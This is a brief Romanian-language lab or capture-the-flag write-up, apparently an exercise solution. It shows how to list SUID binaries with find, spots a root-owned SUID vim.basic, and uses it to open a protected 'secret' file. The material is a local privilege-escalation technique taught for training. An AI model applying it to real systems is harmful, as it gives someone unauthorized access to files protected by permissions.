# SUID Thing

Pentru a găsi toate binarele ce au setat bitul de `SUID`, folosiți:

``` shell
find / -perm -u=s -type f 2>/dev/null
```

Rezultatul ar trebui să fie:

``` shell
$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/vim.basic
/usr/bin/sudo
/bin/su
/bin/mount
/bin/umount
```

Observați utilitarul `/usr/bin/vim.basic`:

``` shell
$ ls -l /usr/bin/vim.basic
-rwsr-xr-x 1 root root 3169376 Oct  1  2021 /usr/bin/vim.basic
```

Acum, conținutul fișierului `secret` devine accesibil prin comanda:

``` shell
vim secret
```
